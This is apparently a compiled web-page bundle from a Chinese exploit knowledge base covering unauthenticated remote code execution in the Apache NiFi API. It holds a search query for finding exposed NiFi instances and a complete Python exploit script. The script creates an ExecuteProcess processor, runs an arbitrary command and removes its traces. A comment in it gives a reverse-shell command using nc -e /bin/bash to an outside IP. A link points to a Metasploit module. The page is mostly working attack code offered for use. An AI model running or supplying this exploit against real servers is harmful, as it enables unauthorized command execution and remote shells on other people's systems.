import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as e,o,c,a as n,b as s,d as p,e as i}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"Apache NiFi是Apache Software Foundation的一个软件项目，旨在使软件系统之间的数据流自动化。",-1),k=n("p",null,"参考链接：",-1),d={href:"https://twitter.com/chybeta/status/1333341820596568065",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/imjdl/Apache-NiFi-Api-RCE",target:"_blank",rel:"noopener noreferrer"},m={href:"https://forum.ywhack.com/thread-114763-1-3.html",target:"_blank",rel:"noopener noreferrer"},b=i(`<h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;nifi&quot; &amp;&amp; title==&quot;NiFi&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>exp：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> sys
<span class="token keyword">import</span> json
<span class="token keyword">import</span> requests <span class="token keyword">as</span> req


<span class="token keyword">class</span> <span class="token class-name">Exp</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url

    <span class="token keyword">def</span> <span class="token function">check_is_vul</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> self<span class="token punctuation">.</span>url <span class="token operator">+</span> <span class="token string">&quot;/nifi-api/access/config&quot;</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> req<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            data <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token keyword">not</span> data<span class="token punctuation">[</span><span class="token string">&quot;config&quot;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&quot;supportsLogin&quot;</span><span class="token punctuation">]</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">def</span> <span class="token function">clean_up</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> p_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> self<span class="token punctuation">.</span>url <span class="token operator">+</span> <span class="token string">&quot;/nifi-api/processors/&quot;</span> <span class="token operator">+</span> p_id <span class="token operator">+</span> <span class="token string">&quot;/run-status&quot;</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;revision&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">&#39;clientId&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;x&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;version&#39;</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">&#39;state&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;STOPPED&#39;</span><span class="token punctuation">}</span>
        req<span class="token punctuation">.</span>put<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        req<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">&quot;/threads&quot;</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
        g_id <span class="token operator">=</span> self<span class="token punctuation">.</span>fetch_process_group<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> g_id<span class="token punctuation">:</span>
            p_id <span class="token operator">=</span> self<span class="token punctuation">.</span>create_process<span class="token punctuation">(</span>g_id<span class="token punctuation">)</span>
            <span class="token keyword">if</span> p_id<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>run_cmd<span class="token punctuation">(</span>p_id<span class="token operator">=</span>p_id<span class="token punctuation">,</span> cmd<span class="token operator">=</span>cmd<span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>clean_up<span class="token punctuation">(</span>p_id<span class="token operator">=</span>p_id<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">run_cmd</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> p_id<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> self<span class="token punctuation">.</span>url <span class="token operator">+</span> <span class="token string">&quot;/nifi-api/processors/&quot;</span> <span class="token operator">+</span> p_id
        cmd <span class="token operator">=</span> cmd<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot; &quot;</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;component&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
                <span class="token string">&#39;config&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
                    <span class="token string">&#39;autoTerminatedRelationships&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">&#39;success&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                    <span class="token string">&#39;properties&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
                        <span class="token string">&#39;Command&#39;</span><span class="token punctuation">:</span> cmd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                        <span class="token string">&#39;Command Arguments&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot; &quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cmd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                    <span class="token punctuation">}</span><span class="token punctuation">,</span>
                    <span class="token string">&#39;schedulingPeriod&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;3600 sec&#39;</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
                <span class="token string">&#39;id&#39;</span><span class="token punctuation">:</span> p_id<span class="token punctuation">,</span>
                <span class="token string">&#39;state&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;RUNNING&#39;</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token string">&#39;revision&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">&#39;clientId&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;x&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;version&#39;</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        headers <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
        res <span class="token operator">=</span> req<span class="token punctuation">.</span>put<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">fetch_process_group</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> self<span class="token punctuation">.</span>url <span class="token operator">+</span> <span class="token string">&quot;/nifi-api/process-groups/root&quot;</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> req<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            data <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">]</span>
            <span class="token keyword">return</span> data
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        <span class="token keyword">return</span> <span class="token number">0</span>

    <span class="token keyword">def</span> <span class="token function">create_process</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> process_group_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> self<span class="token punctuation">.</span>url <span class="token operator">+</span> <span class="token string">&quot;/nifi-api/process-groups/&quot;</span> <span class="token operator">+</span> process_group_id <span class="token operator">+</span> <span class="token string">&quot;/processors&quot;</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;component&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
                <span class="token string">&#39;type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;org.apache.nifi.processors.standard.ExecuteProcess&#39;</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token string">&#39;revision&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
                <span class="token string">&#39;version&#39;</span><span class="token punctuation">:</span> <span class="token number">0</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        headers <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">]</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        <span class="token keyword">return</span> <span class="token number">0</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;rce.py url cmd&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># http://192.168.1.1:8080</span>
        cmd <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>  <span class="token comment"># nc -e /bin/bash 192.168.1.129 1234</span>
        e <span class="token operator">=</span> Exp<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        e<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>msf模块：</p>`,6),_={href:"https://packetstormsecurity.com/files/160260/apache_nifi_processor_rce.rb.txt",target:"_blank",rel:"noopener noreferrer"};function g(f,h){const a=e("ExternalLinkIcon");return o(),c("div",null,[u,r,k,n("ul",null,[n("li",null,[n("a",d,[s("https://twitter.com/chybeta/status/1333341820596568065"),p(a)])]),n("li",null,[n("a",v,[s("https://github.com/imjdl/Apache-NiFi-Api-RCE"),p(a)])]),n("li",null,[n("a",m,[s("https://forum.ywhack.com/thread-114763-1-3.html"),p(a)])])]),b,n("p",null,[n("a",_,[s("https://packetstormsecurity.com/files/160260/apache_nifi_processor_rce.rb.txt"),p(a)])])])}const w=t(l,[["render",g],["__file","Apache NiFi Api 远程代码执行 RCE.html.vue"]]);export{w as default};
